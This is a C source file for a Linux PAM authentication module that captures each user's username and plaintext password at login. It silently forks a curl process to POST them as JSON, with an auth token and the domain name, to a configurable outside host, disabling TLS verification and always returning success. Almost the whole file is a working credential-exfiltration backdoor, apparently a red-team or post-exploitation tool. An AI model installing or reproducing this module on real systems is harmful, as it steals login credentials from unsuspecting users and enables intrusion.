#include <security/pam_appl.h> // yum install pam-devel
#include <security/pam_ext.h>
#include <security/pam_modules.h>

#include <sys/utsname.h>
#include <sys/wait.h>

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>
#include <unistd.h>

#ifdef DEBUG
    #define DEBUG_LOG(...) syslog(LOG_INFO, __VA_ARGS__)
#else
    #define DEBUG_LOG(...)
#endif

static const char c_JsonTemplate[] =
    "{"
        "\"auth_token\": \"%s\", "
        "\"domain\": \"%s\", "
        "\"username\": \"%s\", "
        "\"password\": \"%s\""
    "}";
static const char c_BangEndpointFmt[] = "https://%s/bang/log/";

// stampable values - configured via web interface or helper script
static const char c_BangHttpsHostname[128] = "EVERYBODYGETUP";
static const char c_BangAuthToken[] = "00000000-0000-0000-0000-000000000000";

PAM_EXTERN
int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_LOG("pam_sm_setcred called");
    return PAM_SUCCESS;
}

PAM_EXTERN
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_LOG("pam_sm_acct_mgmt called");
    return PAM_SUCCESS;
}

PAM_EXTERN
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
{
    DEBUG_LOG("pam_sm_authenticate called");

    const char *username = NULL;
    const char *password = NULL;

    // user should not be prompted here if the module is configured with use_first_pass
    if (PAM_SUCCESS != pam_get_user(pamh, &username, "Username: "))
    {
        DEBUG_LOG("pam_get_user failed!");
        return PAM_PERM_DENIED;
    }
    if (PAM_SUCCESS != pam_get_authtok(pamh, PAM_AUTHTOK, &password, "Password: "))
    {
        DEBUG_LOG("pam_get_authtok failed!");
        return PAM_PERM_DENIED;
    }

    pid_t child_pid = fork();
    if (0 == child_pid)
    {
        char json_data[256] = {0};
        char bang_endpoint[128] = {0};
        struct utsname name = {0};
        int null = open("/dev/null", O_WRONLY);
        
        // redirect output to /dev/null
        dup2(null, STDOUT_FILENO);
        dup2(null, STDERR_FILENO);

        uname(&name);  // attempt to get the domain name
        snprintf(
            json_data, sizeof(json_data) - 1, c_JsonTemplate, c_BangAuthToken, name.__domainname, username, password);
        DEBUG_LOG("%s", json_data);

        // craft a cURL request
        snprintf(bang_endpoint, sizeof(bang_endpoint) - 1, c_BangEndpointFmt, c_BangHttpsHostname);
        execlp("curl", "-X", "POST", "-d", json_data, "-k", bang_endpoint, NULL);
    }
#ifdef DEBUG
    else
    {
        int status = 0;
        if (child_pid == waitpid(child_pid, &status, WUNTRACED))
        {
            DEBUG_LOG("child pid %d exited with status %d", child_pid, WEXITSTATUS(status));
        }
        else
        {
            DEBUG_LOG("failed to wait for child pid %d: %d", child_pid, errno);
        }
    }
#endif

    return PAM_SUCCESS;
}